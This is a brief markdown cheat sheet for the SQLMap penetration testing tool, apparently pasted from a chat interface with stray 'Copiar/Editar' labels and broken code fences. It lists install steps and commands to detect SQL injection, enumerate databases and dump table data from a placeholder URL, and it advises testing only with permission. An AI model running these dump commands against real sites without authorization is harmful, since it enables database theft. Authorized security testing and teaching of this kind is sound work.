### **SQLMap.md**
```markdown
# Vulnerability Assessment: SQLMap

## Overview
SQLMap is an open-source penetration testing tool used to detect and exploit SQL injection vulnerabilities in web applications. It automates the process of finding and exploiting SQL injection flaws.

## Key Features
- Automatic detection and exploitation of SQL injection vulnerabilities
- Support for various databases (MySQL, PostgreSQL, Oracle, MSSQL, etc.)
- Dump database tables and extract data
- Brute-force login credentials and hashes

## Installation
```bash
# Install SQLMap on Linux
sudo apt update
sudo apt install sqlmap

# Verify installation
sqlmap --help
Basic Usage
bash
Copiar
Editar
# Test a URL for SQL injection
sqlmap -u "http://example.com/page.php?id=1"

# Enumerate databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump a specific database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# Dump data from a table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
Tips
Always test in a controlled environment or with permission

Combine SQLMap results with other vulnerability scans for comprehensive assessment

Use --batch for automated testing without prompts

Keep SQLMap updated for latest detection techniques